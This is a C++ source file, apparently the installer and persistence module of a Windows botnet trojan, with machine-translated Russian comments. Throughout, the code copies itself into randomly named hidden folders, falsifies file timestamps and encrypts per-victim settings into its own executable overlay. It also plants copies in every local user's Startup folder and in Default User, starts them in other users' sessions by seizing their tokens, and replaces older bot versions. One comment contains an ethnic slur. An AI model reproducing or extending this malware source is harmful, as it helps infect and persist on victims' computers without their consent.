#include <windows.h>
#include <accctrl.h>
#include <lm.h>
#include <userenv.h>
#include <shlobj.h>
#include <wtsapi32.h>
#include <shlwapi.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "coreinstall.h"
#include "corecontrol.h"
#include "osenv.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\time.h"
#include "..\common\debug.h"
#include "..\common\winsecurity.h"
#include "..\common\peimage.h"
#include "..\common\fs.h"
#include "..\common\process.h"
#include "..\common\registry.h"

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//В Settings
//////////////////////////////////////////////////// ////////////////////////////////////////////////

//Reserve sekudny to generate temporary file.
#define FILETIME_GENERATOR_RESERVED_SECONDS (12 * 60 * 60)

//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  Генерация базового файла.

  IN path      - путь, где будет генерироваться файл. Путь должен сущестовать.
  OUT name     - полное имя файла. Реально имя генерируемого файла до 20(4 + 6 + 1 + 5)
                 символов.
  IN extension - расширение файла, NULL для автогенерации.
  IN lowAccess - включить доступ для Low Integrity приложений.

  Return       - true - в случаи успеха,
                 false - в случаи ошибки.
*/
static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool lowAccess)
{
  WCHAR tmpPath[MAX_PATH];
  WCHAR ext[5];

  //Generate the extension if it is not specified.
  if(extension == NULL)
  {
    extension = ext;
    *extension = '.';
    MalwareTools::_GenerateRandomNameW(MalwareTools::NCF_ALL_LOWER, ext + 1, 3, (sizeof(ext) / sizeof(WCHAR)) - 2);
  }

  //Establishment of a directory.
  {
    bool ok = false;
    if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_FIRST_UPPER, path, tmpPath, NULL, 4, 6))
    {
      if(CWA(kernel32, CreateDirectoryW)(tmpPath, /*&coreData.securityAttributes.saAllowAll*/NULL) != FALSE)
      {
        if(lowAccess)WinSecurity::_setLowIntegrityLevelLabel(tmpPath, SE_FILE_OBJECT, true);
        ok = true;
      }
    }
    
    if(!ok)
    {
      WDEBUG1(WDDT_ERROR, "Failed to create folder: %s", tmpPath);
      return false;
    }
  }

  //Creating a.
  {
    bool ok = false;
    if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_ALL_LOWER, tmpPath, name, extension, 4, 5))
    {
      HANDLE file = CWA(kernel32, CreateFile)(name, GENERIC_WRITE | GENERIC_READ, 0, lowAccess ? &coreData.securityAttributes.saAllowAll : NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
      if(file != INVALID_HANDLE_VALUE)
      {
        CWA(kernel32, CloseHandle)(file);
        ok = true;
      }
    }

    if(!ok)
    {
      WDEBUG1(WDDT_ERROR, "Failed to create file: %s", tmpPath);
      return false;
    }
  }

  WDEBUG1(WDDT_INFO, "Basic file: %s", name);
  return true;
}

/*
  Получение Raw-адреса функции.

  IN ppe   - образ.
  IN pData - данные в текущем образе.

  Return   - адрес данных в ppe, или NULL в случаи ошибки.
*/
static void *getRawOfData(PeImage::PEDATA *pe, void *data)
{
  DWORD a = (DWORD)(((LPBYTE)data) - ((LPBYTE)coreData.modules.current));
  WORD i;
  void *r = NULL;

  if((a = PeImage::_rvaToRsa(pe, a, &i)) > 0)r = (void *)(pe->sectionsRawData[i] + a);

  return r;
}

/*
  Запись в файл.

  IN data     - данные.
  IN dataSize - размер данных.
  IN fileName - файл.
  IN infinite - пытаться записать файл бесконечно.

  Return      - true - в случаи успеха,
                false - в случаи ошибки.
*/
static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool infinite)
{
  //Sometimes the file chemto take after completing the process. Waiting ...
  for(BYTE loop = 0;; loop++)
  {
    CWA(kernel32, SetFileAttributesW)(fileName, FILE_ATTRIBUTE_ARCHIVE);
    if(Fs::_saveToFile(fileName, data, dataSize))
    {
      return true;
    }
    else
    {
      WDEBUG0(WDDT_ERROR, "Failed to save PE file.");
      if(infinite == false && loop == 10)break;
    }
    CWA(kernel32, Sleep)(5000 + loop);
  }

  return false;
}

/*
  Сохранение образа в PE-файл.

  IN pes         - настроки PE. Если NULL, происходит просто копирование текущего образа с оверлеем.
  IN fileName    - имя файла.
  IN infinite    - пытаться записать файл бесконечно.

  Return         - true - в случаи успеха,
                   false - в случаи ошибки.
*/
static bool savePeFile(const PESETTINGS *pes, const LPWSTR fileName, bool infinite)
{
  bool ok = false;
  PeImage::PEDATA pdOriginal;
  Fs::MEMFILE mf;
  WDEBUG0(WDDT_INFO, "Saving PE file...");

  if(Fs::_fileToMem(coreData.paths.process, &mf, 0))
  {
    if(pes == NULL)
    {
      ok = saveFile(mf.data, mf.size, fileName, infinite);
      Fs::_closeMemFile(&mf);
    }
    else
    {
      DWORD imageSize = mf.size;
      LPBYTE image    = (LPBYTE)Mem::copyEx(mf.data, mf.size);
      Fs::_closeMemFile(&mf);

      if(image != NULL)
      {
        if(Core::setBaseOverlay(image, imageSize, pes, sizeof(PESETTINGS)))ok = saveFile(image, imageSize, fileName, infinite);
        Mem::free(image);
      }
    }
  }
  
# if(BO_DEBUG > 0)
  if(!ok)WDEBUG0(WDDT_ERROR, "Failed.");
# endif

  return ok;
}

/*
  Функция для остановки сервисных потоков бота.

  IN wait - TRUE - ожидать завершения сервисов,
            FALSE - не ожидать заверешния сервисов.

  Return  - TRUE - в случаи успеха,
            FALSE - в случаи ошибки.
*/
static BOOL WINAPI stopServices(void *reserved)
{
  CWA(kernel32, SetEvent)(coreData.globalHandles.stopEvent);
  //If zapuskvypolenn of yourself, you're not going to wait myself.
  if(coreData.globalHandles.stopedEvent != CURRENT_PROCESS)CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopedEvent, INFINITE);
  return TRUE;
}

static BOOL WINAPI uninstall(void *reserved)
{
  return CoreInstall::_uninstall(true) ? TRUE : FALSE;
}

typedef BOOL (WINAPI *WTSENUMERATESESSIONSW)(HANDLE server, DWORD reserved, DWORD version, PWTS_SESSION_INFOW* sessionInfo, DWORD* count);
typedef void (WINAPI *WTSFREEMEMORY)(PVOID memory);
typedef BOOL (WINAPI *WTSQUERYUSERTOKEN)(ULONG sessionId, PHANDLE token);

/*
  Создание процесса в определенной сессии.

  IN queryUserToken - WTSQueryUserToken.
  IN sessionId      - сессия.
  IN sid            - если SID сессии не равен этому SID'у, процесс не создается.
  IN fileName       - файл для запуска.  
*/
static void createProcessForSession(WTSQUERYUSERTOKEN queryUserToken, DWORD sessionId, PSID sid, const LPWSTR fileName)
{
  HANDLE userToken;
  if(queryUserToken(sessionId, &userToken) != FALSE)
  {
    TOKEN_USER *tu = WinSecurity::_getUserByToken(userToken);
    if(tu != NULL)
    {
      if(CWA(advapi32, EqualSid)(tu->User.Sid, sid) != FALSE)
      {
        //FIXME: DuplicateHandleEx?
        WDEBUG1(WDDT_INFO, "Creating process for session %u.", sessionId);
        Process::_createAsUserEx(userToken, NULL, fileName, NULL, NULL, NULL, NULL);
      }
      Mem::free(tu);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "WinSecurity::_getUserByToken failed.");
#   endif
    CWA(kernel32, CloseHandle)(userToken);
  }
# if(BO_DEBUG > 0)
  else WDEBUG0(WDDT_ERROR, "WTSQueryUserToken failed.");
# endif
}

/*
  Поиск активных сессий пользователя, и запуск из под них процессов.

  IN sid      - SID пользоваетеля.
  IN fileName - файл для запуска.
*/
static void tryToRunForActiveSessions(PSID sid, const LPWSTR fileName)
{
  HMODULE dll;
  {
    CSTR_GETW(dllName, module_wtsapi32);
    dll = CWA(kernel32, LoadLibraryW)(dllName);
  }

  if(dll != NULL)
  {    
    WTSENUMERATESESSIONSW enumerateSessions;
    WTSFREEMEMORY freeMemory;
    WTSQUERYUSERTOKEN queryUserToken;
    {
      CSTR_GETA(enumerateSessionsName, wtsapi32_enumeratesessions);
      enumerateSessions = (WTSENUMERATESESSIONSW)CWA(kernel32, GetProcAddress)(dll, enumerateSessionsName);
    }
    {
      CSTR_GETA(freeMemoryName, wtsapi32_freememory);
      freeMemory = (WTSFREEMEMORY)CWA(kernel32, GetProcAddress)(dll, freeMemoryName);
    }
    {
      CSTR_GETA(queryUserTokenName, wtsapi32_queryusertoken);
      queryUserToken = (WTSQUERYUSERTOKEN)CWA(kernel32, GetProcAddress)(dll, queryUserTokenName);
    }
    
    if(enumerateSessions != NULL && freeMemory != NULL && queryUserToken != NULL)
    {
      Process::_enablePrivilege(SE_TCB_NAME, true); //For WTSQueryUserToken.
      
      //Interactive session handled separately, in case the terminal server is not running, etc.
      DWORD activeSession = CWA(kernel32, WTSGetActiveConsoleSessionId)();
      WDEBUG1(WDDT_INFO, "activeSession=%u.", activeSession);
      
      //Consider the interactive session.
      if(activeSession != (DWORD)-1)createProcessForSession(queryUserToken, activeSession, sid, fileName);

      //Viewed, all sessions except online.
      {
        PWTS_SESSION_INFOW sessions;
        DWORD sessionsCount;

        if(enumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &sessionsCount) != FALSE)
        {
          WDEBUG1(WDDT_INFO, "sessionsCount=%u.", sessionsCount);
          for(DWORD i = 0; i < sessionsCount; i++)
          {
            WDEBUG4(WDDT_INFO, "sessions[%u].State=%u, sessions[%u].SessionId=%u", i, sessions[i].State, i, sessions[i].SessionId);
            if((sessions[i].State == WTSActive || sessions[i].State == WTSDisconnected) && sessions[i].SessionId != activeSession)
            {
              createProcessForSession(queryUserToken, sessions[i].SessionId, sid, fileName);
            }
          }
          freeMemory(sessions);
        }
#       if(BO_DEBUG > 0)
        else WDEBUG0(WDDT_ERROR, "WTSEnumerateSessionsW failed.");
#       endif
      }
    }
    CWA(kernel32, FreeLibrary)(dll);
  }
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////

bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
{
  bool ok = false;  
  WCHAR pathCoreFile[MAX_PATH];
  WCHAR pathReportFile[MAX_PATH];
  WCHAR pathRegKey[10];
  
  //Just in case.
  if(CWA(kernel32, GetFileAttributesW)(pathHome) == INVALID_FILE_ATTRIBUTES)Fs::_createDirectoryTree(pathHome, NULL);

  if(generateBasicFile(pathHome, pathCoreFile, FILEEXTENSION_EXECUTABLE, false) &&
     generateBasicFile(pathHome, pathReportFile, NULL, true) &&
     MalwareTools::_GenerateRandomRegKeyName(MalwareTools::NCF_FIRST_UPPER, HKEY_CURRENT_USER, PATH_REGKEY, pathRegKey, 4, 6))
  {
    //Pishim prvyazki to the current operating system and user.
    PESETTINGS pes;
    Mem::_zero(&pes, sizeof(PESETTINGS));

    //Fill in the information the OS.
    Core::_generateBotId(pes.compId);
    MalwareTools::_getOsGuid(&pes.guid);
    Crypt::_generateRc4Key(&pes.rc4Key);
    
    pes.size = sizeof(PESETTINGS);
    WDEBUG5(WDDT_INFO, "Current OS guid {%08X-%04X-%04X-%08X%08X}.", pes.guid.Data1, pes.guid.Data2, pes.guid.Data3, *((LPDWORD)&pes.guid.Data4[0]), *((LPDWORD)&pes.guid.Data4[4]));

    //The whole thing can be preserved only with characters <127, so it makes no sense to keep
    //them in Unicode.
    {
      DWORD pathHomeSize = Str::_LengthW(pathHome) + 1;
      Str::_unicodeToAnsi(pathCoreFile + pathHomeSize,   -1, pes.userPaths.coreFile,   sizeof(pes.userPaths.coreFile) / sizeof(char));
      Str::_unicodeToAnsi(pathReportFile + pathHomeSize, -1, pes.userPaths.reportFile, sizeof(pes.userPaths.reportFile) / sizeof(char));
      Str::_unicodeToAnsi(pathRegKey,                    -1, pes.userPaths.regKey,     sizeof(pes.userPaths.regKey) / sizeof(char));
      
      //Generate value in the registry.
      {
        LPSTR values[3];
        values[0] = pes.userPaths.regDynamicConfig;
        values[1] = pes.userPaths.regLocalConfig;
        values[2] = pes.userPaths.regLocalSettings;

        for(BYTE i = 0; i < sizeof(values) / sizeof(LPSTR); i++)
        {
          MalwareTools::_GenerateRandomNameA(MalwareTools::NCF_FIRST_UPPER, values[i], 4, CORE_REGISTRY_VALUE_BUFFER_SIZE - 1);
          for(BYTE k = 0; k < i; k++)if(CWA(kernel32, lstrcmpiA)(values[k], values[i]) == 0){i--; break;}
        }
      }

      //Random number for the infection process.
      pes.processInfecionId = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));

      //XOR key for storing records.
      pes.storageArrayKey = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));
      
      WDEBUG6(WDDT_INFO, "pes.userPaths.coreFile=[%S], pes.userPaths.reportFile=[%S], pes.userPaths.regKey=[%S], pes.userPaths.regDynamicConfig=[%S], pes.userPaths.regLocalConfig=[%S], pes.userPaths.regLocalSettings=[%S]",
              pes.userPaths.coreFile, pes.userPaths.reportFile, pes.userPaths.regKey, pes.userPaths.regDynamicConfig, pes.userPaths.regLocalConfig, pes.userPaths.regLocalSettings);
    }

    //Encrypt
    {
      BASECONFIG baseConfig;
      Core::getBaseConfig(&baseConfig);

      Crypt::RC4KEY rc4k;
      Mem::_copy(&rc4k, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
      Crypt::_rc4(&pes, sizeof(PESETTINGS), &rc4k);
    }

    //Generate a copy of the file.
    if(savePeFile(&pes, pathCoreFile, false))
    {
      //Change the file time.
      FILETIME fileTimeTemplate;
      if(Fs::_getFileTime(true, pathHome, &fileTimeTemplate, NULL, NULL))
      {
        DWORD fileTimeUnixTemplate = Time::_fileTimeToTime(&fileTimeTemplate);
        Fs::_setRandomFileTime(fileTimeUnixTemplate, FILETIME_GENERATOR_RESERVED_SECONDS, pathCoreFile,  1);
        Fs::_setRandomFileTime(fileTimeUnixTemplate, FILETIME_GENERATOR_RESERVED_SECONDS, pathReportFile, 1);
      }
      
      //Final.
      Mem::_copy(&coreData.peSettings, &pes, sizeof(PESETTINGS));
      Str::_CopyW(coreFile, pathCoreFile, -1);
      ok = true;
    }
    Mem::_zero(&pes, sizeof(PESETTINGS)); //Just in case.
  }
# if(BO_DEBUG > 0)
  else WDEBUG0(WDDT_ERROR, "Failed to generate names.");
# endif

  return ok;
}

bool CoreInstall::_loadInstalledData(const void *overlay, DWORD overlaySize)
{
  //Obtain PESETTINGS. Intentionally do not check the error.
  Mem::_copy(&coreData.peSettings, overlay, sizeof(PESETTINGS));

  PESETTINGS ps;
  Core::getPeSettings(&ps);

  //Check.
  WDEBUG5(WDDT_INFO, "Current OS guid {%08X-%04X-%04X-%08X%08X}.", ps.guid.Data1, ps.guid.Data2, ps.guid.Data3, *((LPDWORD)&ps.guid.Data4[0]), *((LPDWORD)&ps.guid.Data4[4]));
  if(Mem::_compare(&coreData.osGuid, &ps.guid, sizeof(GUID)) == 0)
  {
    //Check the path.
    int coreLenght = Str::_LengthW(coreData.paths.process);
    int homeLenght = Str::_LengthW(coreData.paths.home);
    WCHAR coreFile[sizeof(ps.userPaths.coreFile) / sizeof(char)];

    Str::_ansiToUnicode(ps.userPaths.coreFile, -1, coreFile, sizeof(coreFile) / sizeof(WCHAR));

    if(coreLenght > homeLenght && coreData.paths.process[homeLenght] == '\\' &&
       CWA(shlwapi, StrCmpNIW)(coreData.paths.home, coreData.paths.process, homeLenght) == 0 && //File shove from domshney directory.
       CWA(kernel32, lstrcmpiW)(coreFile, coreData.paths.process + homeLenght + 1) == 0) //File shove from nomarlnogo way home directory.
    {
      //Nomarlny launch.
      return true;
    }
#   if(BO_DEBUG > 0)
    else WDEBUG2(WDDT_ERROR, "Bad paths coreData.paths.process=%s, coreData.paths.home=%s.", coreData.paths.process, coreData.paths.home);
#   endif
  }
# if(BO_DEBUG > 0)
  else WDEBUG0(WDDT_ERROR, "Bad OS/User guid.");
# endif
  return false;
}

bool CoreInstall::_update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR coreFile, bool force)
{
  bool ok = false;  

  //Check basic conditions.
  if(bs->structSize == sizeof(BotStatus::VER1) && ((force == true && bs->version <= BO_CLIENT_VERSION) || bs->version < BO_CLIENT_VERSION))
  {
    WDEBUG4(WDDT_INFO, "Updating existing bot %u.%u.%u.%u to current version.", VERSION_MAJOR(bs->version), VERSION_MINOR(bs->version), VERSION_SUBMINOR(bs->version), VERSION_BUILD(bs->version));
    
    //Fill PESETTINGS.
    PESETTINGS pes;
    Mem::_zero(&pes, sizeof(PESETTINGS));
    {
      Mem::_copy(pes.compId,  bs->compId,  sizeof(pes.compId));
      Mem::_copy(&pes.guid,   &bs->guid,   sizeof(GUID));
      Mem::_copy(&pes.rc4Key, &bs->rc4Key, sizeof(Crypt::RC4KEY));

      pes.size = sizeof(PESETTINGS);
      WDEBUG5(WDDT_INFO, "Current OS guid {%08X-%04X-%04X-%08X%08X}.", pes.guid.Data1, pes.guid.Data2, pes.guid.Data3, *((LPDWORD)&pes.guid.Data4[0]), *((LPDWORD)&pes.guid.Data4[4]));

      Str::_unicodeToAnsi(bs->userPaths.coreFile,         -1, pes.userPaths.coreFile,         sizeof(pes.userPaths.coreFile) / sizeof(char));
      Str::_unicodeToAnsi(bs->userPaths.reportFile,       -1, pes.userPaths.reportFile,       sizeof(pes.userPaths.reportFile) / sizeof(char));
      Str::_unicodeToAnsi(bs->userPaths.regKey,           -1, pes.userPaths.regKey,           sizeof(pes.userPaths.regKey) / sizeof(char));
      Str::_unicodeToAnsi(bs->userPaths.regDynamicConfig, -1, pes.userPaths.regDynamicConfig, CORE_REGISTRY_VALUE_BUFFER_SIZE);
      Str::_unicodeToAnsi(bs->userPaths.regLocalConfig,   -1, pes.userPaths.regLocalConfig,   CORE_REGISTRY_VALUE_BUFFER_SIZE);
      Str::_unicodeToAnsi(bs->userPaths.regLocalSettings, -1, pes.userPaths.regLocalSettings, CORE_REGISTRY_VALUE_BUFFER_SIZE);

      //Random number for the infection process.
      pes.processInfecionId = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));
      
      //XOR key for storing records.
      pes.storageArrayKey = bs->storageArrayKey;
      
      WDEBUG6(WDDT_INFO, "pes.userPaths.coreFile=[%S], pes.userPaths.reportFile=[%S], pes.userPaths.regKey=[%S], pes.userPaths.regDynamicConfig=[%S], pes.userPaths.regLocalConfig=[%S], pes.userPaths.regLocalSettings=[%S]",
              pes.userPaths.coreFile, pes.userPaths.reportFile, pes.userPaths.regKey, pes.userPaths.regDynamicConfig, pes.userPaths.regLocalConfig, pes.userPaths.regLocalSettings);
    }

    //Encrypt
    {
      BASECONFIG baseConfig;
      Core::getBaseConfig(&baseConfig);

      Crypt::RC4KEY rc4k;
      Mem::_copy(&rc4k, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
      Crypt::_rc4(&pes, sizeof(PESETTINGS), &rc4k);
    }
    
    //Stop running services.
    if(bs->stopServices != NULL)
    {
      WDEBUG0(WDDT_INFO, "Stopping old bot...");
      bs->stopServices(NULL);
      WDEBUG0(WDDT_INFO, "Old bot stopped!");
    }
    
    //Generate a copy of the file.
    if(Fs::_pathCombine(coreFile, pathHome, bs->userPaths.coreFile) && savePeFile(&pes, coreFile, true))
    {
      //Change the file time.
      FILETIME fileTimeTemplate;
      if(Fs::_getFileTime(true, pathHome, &fileTimeTemplate, NULL, NULL))Fs::_setRandomFileTime(Time::_fileTimeToTime(&fileTimeTemplate), FILETIME_GENERATOR_RESERVED_SECONDS, coreFile, 1);

      //Final.
      Mem::_copy(&coreData.peSettings, &pes, sizeof(PESETTINGS));
      ok = true;
    }
    WDEBUG1(WDDT_INFO, "Updating finished with code %u.", ok);
    Mem::_zero(&pes, sizeof(PESETTINGS)); //Just in case.
  }
# if(BO_DEBUG > 0)
  else WDEBUG4(WDDT_WARNING, "Existing bot %u.%u.%u.%u not need update.", VERSION_MAJOR(bs->version), VERSION_MINOR(bs->version), VERSION_SUBMINOR(bs->version), VERSION_BUILD(bs->version));
# endif

  return ok;
}

void CoreInstall::_loadUpdateData(BotStatus::VER1 *bs)
{
  PESETTINGS pes;
  Core::getPeSettings(&pes);

  //Basic data.
  bs->structSize      = sizeof(BotStatus::VER1);
  bs->flags           = 0;
  bs->version         = BO_CLIENT_VERSION;
  bs->storageArrayKey = pes.storageArrayKey;
  
  Core::getCurrentBotnetName(bs->botnet);
  
  bs->stopServices = stopServices;
  bs->uninstall    = uninstall;

  //Binding.
  bs->reserved = 0;
  Mem::_copy(bs->compId,  pes.compId,  sizeof(pes.compId));
  Mem::_copy(&bs->guid,   &pes.guid,   sizeof(GUID));
  Mem::_copy(&bs->rc4Key, &pes.rc4Key, sizeof(Crypt::RC4KEY));
  
  //Data on the waterways.
  Str::_ansiToUnicode(pes.userPaths.coreFile,         -1, bs->userPaths.coreFile,         sizeof(bs->userPaths.coreFile) / sizeof(WCHAR));
  Str::_ansiToUnicode(pes.userPaths.reportFile,       -1, bs->userPaths.reportFile,       sizeof(bs->userPaths.reportFile) / sizeof(WCHAR));
  Str::_ansiToUnicode(pes.userPaths.regKey,           -1, bs->userPaths.regKey,           sizeof(bs->userPaths.regKey) / sizeof(WCHAR));
  Str::_ansiToUnicode(pes.userPaths.regDynamicConfig, -1, bs->userPaths.regDynamicConfig, CORE_REGISTRY_VALUE_BUFFER_SIZE);
  Str::_ansiToUnicode(pes.userPaths.regLocalConfig,   -1, bs->userPaths.regLocalConfig,   CORE_REGISTRY_VALUE_BUFFER_SIZE);
  Str::_ansiToUnicode(pes.userPaths.regLocalSettings, -1, bs->userPaths.regLocalSettings, CORE_REGISTRY_VALUE_BUFFER_SIZE);

  Mem::_zero(&pes, sizeof(PESETTINGS));
}

bool CoreInstall::_installToAll(void)
{
  //Obtain a tentative path for the Startup folder.
  WCHAR startupPath[MAX_PATH];
  {
    typedef BOOL (WINAPI *GETDEFAULTUSERPROFILEDIRECTORYW)(LPWSTR profileDir, LPDWORD size);
    
    bool ok = false;
    HMODULE dll;
    {
      CSTR_GETW(dllName, module_userenv)
      dll = CWA(kernel32, LoadLibraryW)(dllName);
    }
    
    if(dll != NULL)
    {
      GETDEFAULTUSERPROFILEDIRECTORYW getDefaultUserProfileDirectory;
      {
        CSTR_GETA(func, userenv_getdefuserprofiledir);
        getDefaultUserProfileDirectory = (GETDEFAULTUSERPROFILEDIRECTORYW)CWA(kernel32, GetProcAddress)(dll, func);
      }
      
      if(getDefaultUserProfileDirectory != NULL)
      {
        WCHAR defaultUserRoot[MAX_PATH];
        DWORD size = MAX_PATH;
    
        if(getDefaultUserProfileDirectory(defaultUserRoot, &size) == TRUE)
        {
          if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_STARTUP, (HANDLE)-1, SHGFP_TYPE_DEFAULT, startupPath) == S_OK)
          {
            size = Str::_LengthW(defaultUserRoot);
            if(CWA(shlwapi, StrCmpNIW)(defaultUserRoot, startupPath, size) == 0)
            {
              Str::_CopyW(startupPath, startupPath + size, -1);
              WDEBUG1(WDDT_INFO, "startupPath=[%s].", startupPath);
              ok = true;
            }
#           if(BO_DEBUG > 0)
            else WDEBUG0(WDDT_ERROR, "Failed to get default startup folder.");
#           endif 
          }
#         if(BO_DEBUG > 0)
          else WDEBUG0(WDDT_ERROR, "SHGetFolderPathW failed.");
#         endif 
        }
#       if(BO_DEBUG > 0)
        else WDEBUG0(WDDT_ERROR, "GetDefaultUserProfileDirectoryW failed.");
#       endif 
      }
#     if(BO_DEBUG > 0)
      else WDEBUG0(WDDT_ERROR, "GetDefaultUserProfileDirectoryW not founded.");
#     endif 
      CWA(kernel32, FreeLibrary)(dll);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "userenv.dll not founded.");
#   endif 

    if(!ok)return false;
  }
  
  //Get a list of polozovateley.
  bool ok = false;
  DWORD handle = 0;
  NET_API_STATUS status;
  
  do
  {
    /*В В В В В В Blunt, blunted idusy from MS, do not realize that they are blunt blunt. The fact that in the MSDN
В В В В В В written that NetUserEnum can work with levels 4, 23, and in practice we have
В В В В В В great Hindu PRICK!
В В В В */

    DWORD readed;
    DWORD total;
    USER_INFO_0 *buf0 = NULL;
    status = CWA(netapi32, NetUserEnum)(NULL, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE *)&buf0, MAX_PREFERRED_LENGTH, &readed, &total, &handle);

    if((status == NERR_Success || status == ERROR_MORE_DATA) && buf0 != NULL)
    {
      USER_INFO_23 *buf23;
      for(DWORD i = 0; i < readed; i++)if(CWA(netapi32, NetUserGetInfo)(NULL, buf0[i].usri0_name, 23, (LPBYTE *)&buf23) == NERR_Success && buf23 != NULL)
      {
        //Obtain a directory Startup.
        WCHAR profileDir[MAX_PATH];
        if(OsEnv::_getUserProfileDirectoryhBySid(buf23->usri23_user_sid, profileDir) && Fs::_pathCombine(profileDir, profileDir, startupPath) && Fs::_createDirectoryTree(profileDir, NULL))
        {
          WDEBUG2(WDDT_INFO, "Founded user: name=[%s], profileDir=[%s].", buf23->usri23_name, profileDir);

          //Make a copy of itself in the user profile.
          WCHAR fileName[MAX_PATH];
          if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_ALL_LOWER, profileDir, fileName, FILEEXTENSION_EXECUTABLE, 4, 6) && savePeFile(NULL, fileName, false))
          {
            WDEBUG1(WDDT_INFO, "Copied to \"%s\".", fileName);
            ok = true;
            
            //Trying to start the process.
            tryToRunForActiveSessions(buf23->usri23_user_sid, fileName);
          }
#         if(BO_DEBUG > 0)
          else WDEBUG1(WDDT_ERROR, "Failed to copy itself to statup folder of user \"%s\".", buf23->usri23_name);
#         endif
        }
        CWA(neteapi32, NetApiBufferFree)(buf23);
      }
      CWA(neteapi32, NetApiBufferFree)(buf0);
    }
  }
  while(status == ERROR_MORE_DATA);

  //Well, a copy of Default User.
  if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_STARTUP | CSIDL_FLAG_CREATE, (HANDLE)-1, SHGFP_TYPE_DEFAULT, startupPath) == S_OK)
  {
    WCHAR fileName[MAX_PATH];
    if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_ALL_LOWER, startupPath, fileName, FILEEXTENSION_EXECUTABLE, 4, 6) && savePeFile(NULL, fileName, false))ok = true;
  }
  return ok;
}

bool CoreInstall::_uninstall(bool wait)
{
  WCHAR path1[MAX_PATH];
  WCHAR path2[MAX_PATH];
  
  //Obtain the path.
  Core::getPeSettingsPath(Core::PSP_COREFILE, path1);
  CWA(shlwapi, PathRemoveFileSpecW)(path1);

  Core::getPeSettingsPath(Core::PSP_REPORTFILE, path2);
  CWA(shlwapi, PathRemoveFileSpecW)(path2);

  //Stop the flow.
  coreData.proccessFlags |= Core::CDPF_NO_EXITPROCESS;
  stopServices(NULL);

  //Delete startup.
  CoreControl::_removeAutorun();

  //Delete files from ~.
  {
    Fs::_removeDirectoryTree(path1);
    Fs::_removeDirectoryTree(path2);
  }

  //Removing settings in the registry.
  {
    WCHAR regPath[MAX_PATH];
    Core::getPeSettingsPath(Core::PSP_REGKEY, regPath);
    Registry::_deleteKey(HKEY_CURRENT_USER, regPath);
  }

  //Create a bat-file. To secure delete files.
  {
    char path1Oem[MAX_PATH];
    char path2Oem[MAX_PATH];

    CWA(user32, CharToOemW)(path1, path1Oem);
    CWA(user32, CharToOemW)(path2, path2Oem);

    CSTR_GETA(batch, core_uninstall_batch);
    char buf[MAX_PATH * 4 + 100];
    int size = Str::_sprintfA(buf, sizeof(buf) / sizeof(char), batch, path1Oem, path2Oem, path1Oem, path2Oem);
    if(size > 0)Process::_runTempBatch(buf);
  }

  //If the removal of the primary process shove bot, complete the process.
  if(coreData.globalHandles.stopedEvent == CURRENT_PROCESS)CWA(kernel32, ExitProcess)(0);
  return true;
}
